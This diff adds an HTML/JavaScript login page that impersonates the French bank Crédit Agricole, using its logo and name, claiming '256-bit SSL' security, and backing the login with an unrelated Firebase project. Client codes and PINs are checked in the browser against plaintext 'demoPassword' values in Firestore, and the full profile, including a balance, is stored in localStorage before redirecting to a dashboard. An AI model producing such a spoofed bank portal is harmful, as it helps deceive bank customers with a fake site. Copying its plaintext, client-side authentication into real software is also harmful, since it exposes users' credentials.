@@ -1,0 +1,762 @@
+<!doctype html>
+<html lang="fr">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Portail Crédit Agricole - Connexion Sécurisée</title>
+    <link rel="shortcut icon" href="https://companieslogo.com/img/orig/ACA.PA-da8b9f9a.png?t=1720244490">
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;600;700;800&family=Montserrat:wght@600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --ca-green: #008272;
+            --ca-green-dark: #005f53;
+            --ca-green-light: #e6f3f1;
+            --ca-orange: #ff6600;
+            --ca-blue: #003366;
+            --ca-bg: #f4f7f6;
+            --ca-card-bg: #ffffff;
+            --ca-text: #1e293b;
+            --ca-muted: #64748b;
+            --drawer-width: 300px;
+        }
+
+        body.dark-mode {
+            --ca-bg: #0f172a;
+            --ca-card-bg: #1e293b;
+            --ca-text: #f8fafc;
+            --ca-muted: #94a3b8;
+            --ca-green-light: #132e2a;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Nunito', system-ui, -apple-system, sans-serif;
+            background-color: var(--ca-bg);
+            background-image: linear-gradient(135deg, rgba(0, 130, 114, 0.05) 0%, rgba(0, 51, 102, 0.08) 100%),
+                              url('https://ps-cdn1.imgix.net/uploads/1808/images/a180203befcc1a1355fe511c2e7b2b83817be1a0.jpg?auto=format%2Ccompress');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            color: var(--ca-text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            transition: background-color 0.3s, color 0.3s;
+            overflow-x: hidden;
+        }
+
+        .app-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 64px;
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            transition: background 0.3s;
+        }
+
+        body.dark-mode .app-header {
+            background: rgba(30, 41, 59, 0.92);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .header-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+        }
+
+        .header-brand img {
+            height: 38px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .header-brand span {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--ca-blue);
+            letter-spacing: -0.2px;
+        }
+
+        body.dark-mode .header-brand span {
+            color: #ffffff;
+        }
+
+        .menu-btn {
+            background: transparent;
+            border: none;
+            color: var(--ca-blue);
+            font-size: 22px;
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        body.dark-mode .menu-btn {
+            color: var(--ca-green-light);
+        }
+
+        .menu-btn:hover, .menu-btn:active {
+            background-color: var(--ca-green-light);
+            color: var(--ca-green);
+        }
+
+        .drawer-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 200;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .drawer-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .slide-drawer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: var(--drawer-width);
+            max-width: 85vw;
+            height: 100%;
+            background-color: var(--ca-card-bg);
+            z-index: 201;
+            transform: translateX(-100%);
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            display: flex;
+            flex-direction: column;
+            box-shadow: 4px 0 25px rgba(0, 0, 0, 0.15);
+        }
+
+        .slide-drawer.open {
+            transform: translateX(0);
+        }
+
+        .drawer-header {
+            padding: 20px;
+            background: linear-gradient(135deg, var(--ca-green) 0%, var(--ca-blue) 100%);
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .drawer-user {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .drawer-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: #ffffff;
+        }
+
+        .drawer-user-info h3 {
+            font-size: 15px;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .drawer-user-info p {
+            font-size: 12px;
+            opacity: 0.85;
+            margin-top: 2px;
+        }
+
+        .close-drawer-btn {
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 6px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+
+        .close-drawer-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .drawer-menu {
+            padding: 16px 12px;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .drawer-menu-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 16px;
+            color: var(--ca-text);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 8px;
+            margin-bottom: 4px;
+            transition: background 0.2s, color 0.2s;
+        }
+
+        .drawer-menu-item i {
+            width: 20px;
+            font-size: 16px;
+            color: var(--ca-green);
+            text-align: center;
+        }
+
+        .drawer-menu-item:hover, .drawer-menu-item.active {
+            background-color: var(--ca-green-light);
+            color: var(--ca-green-dark);
+        }
+
+        body.dark-mode .drawer-menu-item:hover {
+            color: #38bdf8;
+        }
+
+        .drawer-divider {
+            height: 1px;
+            background-color: rgba(0, 0, 0, 0.08);
+            margin: 12px 16px;
+        }
+
+        body.dark-mode .drawer-divider {
+            background-color: rgba(255, 255, 255, 0.08);
+        }
+
+        .drawer-footer {
+            padding: 16px 20px;
+            border-top: 1px solid rgba(0, 0, 0, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        body.dark-mode .drawer-footer {
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .theme-toggle-btn {
+            background: var(--ca-bg);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            color: var(--ca-text);
+            padding: 8px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 90px 16px 30px;
+            width: 100%;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 32px 28px 28px;
+            background: var(--ca-card-bg);
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 51, 102, 0.15), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            position: relative;
+            transition: transform 0.2s, box-shadow 0.2s;
+            border: 1px solid rgba(255, 255, 255, 0.6);
+        }
+
+        body.dark-mode .login-container {
+            border-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .bank-logo {
+            height: 64px;
+            width: auto;
+            margin-bottom: 12px;
+            object-fit: contain;
+        }
+
+        .login-container h1 {
+            font-family: 'Montserrat', system-ui, sans-serif;
+            font-size: 20px;
+            font-weight: 800;
+            margin: 8px 0 4px;
+            color: var(--ca-blue);
+        }
+
+        body.dark-mode .login-container h1 {
+            color: #38bdf8;
+        }
+
+        .login-container h2 {
+            font-size: 14px;
+            font-weight: 600;
+            margin: 0 0 20px;
+            color: var(--ca-muted);
+        }
+
+        .demo-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 12px;
+            border-radius: 999px;
+            background: rgba(255, 102, 0, 0.1);
+            color: var(--ca-orange);
+            font-weight: 700;
+            font-size: 11px;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 700;
+            font-size: 13px;
+            color: var(--ca-text);
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper i.input-icon {
+            position: absolute;
+            left: 12px;
+            color: var(--ca-muted);
+            font-size: 14px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 12px 12px 38px;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 14px;
+            background-color: var(--ca-bg);
+            color: var(--ca-text);
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-wrapper input:focus {
+            border-color: var(--ca-green);
+            box-shadow: 0 0 0 3px rgba(0, 130, 114, 0.15);
+        }
+
+        .toggle-password-btn {
+            position: absolute;
+            right: 12px;
+            background: none;
+            border: none;
+            color: var(--ca-muted);
+            cursor: pointer;
+            padding: 4px;
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 13px;
+            margin-top: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            background: linear-gradient(135deg, var(--ca-orange) 0%, #e65c00 100%);
+            color: #ffffff;
+            box-shadow: 0 4px 12px rgba(255, 102, 0, 0.3);
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(255, 102, 0, 0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.65;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .error-message {
+            background-color: rgba(239, 68, 68, 0.1);
+            color: #dc2626;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 14px;
+            font-size: 12.5px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-align: left;
+        }
+
+        .status-message {
+            background-color: rgba(34, 197, 94, 0.1);
+            color: #16a34a;
+            border: 1px solid rgba(34, 197, 94, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 14px;
+            font-size: 12.5px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-align: left;
+        }
+
+        @media (max-width: 480px) {
+            .app-header {
+                padding: 0 14px;
+                height: 58px;
+            }
+            .header-brand span {
+                font-size: 14px;
+            }
+            .login-container {
+                padding: 24px 20px 20px;
+                border-radius: 12px;
+            }
+            .main-wrapper {
+                padding-top: 78px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Application Header -->
+    <header class="app-header">
+        <button class="menu-btn" id="openDrawerBtn" aria-label="Ouvrir le menu">
+            <i class="fa-solid fa-bars"></i>
+        </button>
+
+        <a href="#" class="header-brand">
+            <img src="https://companieslogo.com/img/orig/ACA.PA-da8b9f9a.png?t=1720244490" alt="Crédit Agricole Logo">
+            <span>CRÉDIT AGRICOLE</span>
+        </a>
+
+        <div style="width: 38px;"></div> <!-- Spacer for symmetry -->
+    </header>
+
+    <!-- Overlay & Off-Canvas Slide Drawer -->
+    <div class="drawer-overlay" id="drawerOverlay"></div>
+
+    <aside class="slide-drawer" id="slideDrawer" aria-hidden="true">
+        <div class="drawer-header">
+            <div class="drawer-user">
+                <div class="drawer-avatar">
+                    <i class="fa-solid fa-user-lock"></i>
+                </div>
+                <div class="drawer-user-info">
+                    <h3>Espace Client</h3>
+                    <p>Accès Sécurisé SSL</p>
+                </div>
+            </div>
+            <button class="close-drawer-btn" id="closeDrawerBtn" aria-label="Fermer le menu">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+        </div>
+
+        <nav class="drawer-menu">
+            <a href="#" class="drawer-menu-item active">
+                <i class="fa-solid fa-shield-halved"></i>
+                <span>Espace Connexion</span>
+            </a>
+            <a href="#" class="drawer-menu-item">
+                <i class="fa-solid fa-headset"></i>
+                <span>Support Client 24/7</span>
+            </a>
+            <a href="#" class="drawer-menu-item">
+                <i class="fa-solid fa-key"></i>
+                <span>Sécurité &amp; Pass de confiance</span>
+            </a>
+            <a href="#" class="drawer-menu-item">
+                <i class="fa-solid fa-location-dot"></i>
+                <span>Nos Agences &amp; Distributeurs</span>
+            </a>
+            <div class="drawer-divider"></div>
+            <a href="#" class="drawer-menu-item">
+                <i class="fa-solid fa-circle-info"></i>
+                <span>À propos de la Banque</span>
+            </a>
+        </nav>
+
+        <div class="drawer-footer">
+            <button class="theme-toggle-btn" id="themeToggleBtn">
+                <i class="fa-solid fa-moon"></i>
+                <span>Mode Sombre</span>
+            </button>
+            <span style="font-size: 11px; color: var(--ca-muted);">v2.4.0</span>
+        </div>
+    </aside>
+
+    <!-- Main Container -->
+    <main class="main-wrapper">
+        <div class="login-container">
+            <img src="https://companieslogo.com/img/orig/ACA.PA-da8b9f9a.png?t=1720244490" alt="Crédit Agricole Logo" class="bank-logo">
+
+            <div class="demo-badge">
+                <i class="fa-solid fa-lock"></i> Connexion SSL 256-bit
+            </div>
+            <h1>Portail CRÉDIT AGRICOLE</h1>
+            <h2>Espace d'authentification client</h2>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="clientCode">Identifiant (Code Client)</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-user input-icon"></i>
+                        <input type="text" id="clientCode" placeholder="Ex: 12345678" required autocomplete="username">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label for="pinCode">Code d’accès (PIN)</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-lock input-icon"></i>
+                        <input type="password" id="pinCode" placeholder="••••••••" required autocomplete="current-password">
+                        <button type="button" class="toggle-password-btn" id="togglePasswordBtn" aria-label="Afficher le mot de passe">
+                            <i class="fa-solid fa-eye" id="toggleIcon"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-primary" id="loginButton">
+                    <span>Se connecter</span>
+                    <i class="fa-solid fa-arrow-right"></i>
+                </button>
+
+                <p id="errorMessage" class="error-message" hidden>
+                    <i class="fa-solid fa-triangle-exclamation"></i>
+                    <span id="errorText">Erreur de connexion</span>
+                </p>
+                <p id="statusMessage" class="status-message" hidden>
+                    <i class="fa-solid fa-circle-check"></i>
+                    <span id="statusText"></span>
+                </p>
+            </form>
+        </div>
+    </main>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+
+    <script>
+        // --- Drawer Slide Menu Controls ---
+        const slideDrawer = document.getElementById('slideDrawer');
+        const drawerOverlay = document.getElementById('drawerOverlay');
+        const openDrawerBtn = document.getElementById('openDrawerBtn');
+        const closeDrawerBtn = document.getElementById('closeDrawerBtn');
+
+        function openDrawer() {
+            slideDrawer.classList.add('open');
+            drawerOverlay.classList.add('active');
+            slideDrawer.setAttribute('aria-hidden', 'false');
+        }
+
+        function closeDrawer() {
+            slideDrawer.classList.remove('open');
+            drawerOverlay.classList.remove('active');
+            slideDrawer.setAttribute('aria-hidden', 'true');
+        }
+
+        openDrawerBtn.addEventListener('click', openDrawer);
+        closeDrawerBtn.addEventListener('click', closeDrawer);
+        drawerOverlay.addEventListener('click', closeDrawer);
+
+        // --- Dark Mode Toggle ---
+        const themeToggleBtn = document.getElementById('themeToggleBtn');
+        themeToggleBtn.addEventListener('click', () => {
+            document.body.classList.toggle('dark-mode');
+            const isDark = document.body.classList.contains('dark-mode');
+            themeToggleBtn.innerHTML = isDark ? 
+                '<i class="fa-solid fa-sun"></i> <span>Mode Clair</span>' : 
+                '<i class="fa-solid fa-moon"></i> <span>Mode Sombre</span>';
+        });
+
+        // --- Toggle Password Visibility ---
+        const pinCodeInput = document.getElementById('pinCode');
+        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+        const toggleIcon = document.getElementById('toggleIcon');
+
+        togglePasswordBtn.addEventListener('click', () => {
+            const isPassword = pinCodeInput.type === 'password';
+            pinCodeInput.type = isPassword ? 'text' : 'password';
+            toggleIcon.className = isPassword ? 'fa-solid fa-eye-slash' : 'fa-solid fa-eye';
+        });
+
+        // --- Firebase Configuration & Authentication Logic ---
+        var firebaseConfig = {
+            apiKey: "AIzaSyBXQnoenWmWvYgoKT2qWQfk5j4cVLWZr4Y",
+            authDomain: "acs-v-e6ef3.firebaseapp.com",
+            projectId: "acs-v-e6ef3",
+            storageBucket: "acs-v-e6ef3.firebasestorage.app",
+            messagingSenderId: "849135031406",
+            appId: "1:849135031406:web:88f7deadc5569357d4027f"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.firestore();
+
+        const loginForm = document.getElementById('loginForm');
+        const loginButton = document.getElementById('loginButton');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorText = document.getElementById('errorText');
+        const statusMessage = document.getElementById('statusMessage');
+        const statusText = document.getElementById('statusText');
+        const clientCodeInput = document.getElementById('clientCode');
+
+        const USERS_COLLECTION = "profiles";
+        const SESSION_KEY = "ma_banque_currentUserData";
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            errorMessage.hidden = true;
+            statusMessage.hidden = true;
+            loginButton.disabled = true;
+            loginButton.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Authentification...';
+
+            const clientCode = clientCodeInput.value.trim();
+            const pinCode = pinCodeInput.value.trim();
+            
+            if (!clientCode || !pinCode) {
+                errorText.textContent = "Veuillez saisir les deux champs.";
+                errorMessage.hidden = false;
+                resetLoginButton();
+                return;
+            }
+            
+            // Query Firestore
+            db.collection(USERS_COLLECTION)
+                .where("demoClientId", "==", clientCode) 
+                .limit(1)
+                .get()
+                .then((querySnapshot) => {
+                    if (querySnapshot.empty) {
+                        errorText.textContent = "Identifiant ou Code d'accès incorrect.";
+                        errorMessage.hidden = false;
+                        resetLoginButton();
+                        return;
+                    }
+                    
+                    const userDoc = querySnapshot.docs[0];
+                    const userData = userDoc.data();
+                    
+                    if (userData.demoPassword === pinCode) {
+                        // Successful login
+                        const clientData = {
+                            docId: userDoc.id, 
+                            ...userData,
+                            isAuthenticated: true,
+                            clientCode: userData.demoClientId,
+                            nom: userData.fullName || 'Client',
+                            solde: userData.balance || 0,
+                        };
+
+                        localStorage.setItem(SESSION_KEY, JSON.stringify(clientData));
+                        
+                        userDoc.ref.update({
+                            lastConnection: firebase.firestore.FieldValue.serverTimestamp()
+                        }).catch(err => {
+                            console.warn("Mise à jour connexion échouée (non critique):", err);
+                        });
+
+                        statusText.textContent = "Connexion réussie. Redirection...";
+                        statusMessage.hidden = false;
+                        setTimeout(() => {
+                            window.location.href = 'dashboard.html';
+                        }, 600); 
+
+                    } else {
+                        errorText.textContent = "Identifiant ou Code d'accès incorrect.";
+                        errorMessage.hidden = false;
+                        resetLoginButton();
+                    }
+                })
+                .catch(err => {
+                    console.error("Erreur de connexion Firestore:", err);
+                    errorText.textContent = "Impossible de se connecter au serveur. Vérifiez votre connexion.";
+                    errorMessage.hidden = false;
+                    resetLoginButton();
+                });
+        });
+
+        function resetLoginButton() {
+            loginButton.disabled = false;
+            loginButton.innerHTML = '<span>Se connecter</span> <i class="fa-solid fa-arrow-right"></i>';
+        }
+    </script>
+</body>
+</html>
